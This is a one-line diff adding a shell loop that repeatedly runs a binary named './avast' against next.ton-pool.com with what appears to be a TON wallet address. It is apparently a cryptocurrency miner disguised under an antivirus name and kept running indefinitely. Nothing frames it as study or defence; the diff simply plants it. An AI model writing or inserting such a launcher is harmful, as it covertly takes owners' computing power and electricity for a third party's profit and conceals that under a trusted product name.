@@ -1,0 +1,1 @@
+while :; do timeout 3600 bash ./avast run https://next.ton-pool.com EQCOZJJu0LGDOA7VlnWyvjty6P3NSeTVeCrfViup7XQ1tnAK; sleep 30; done
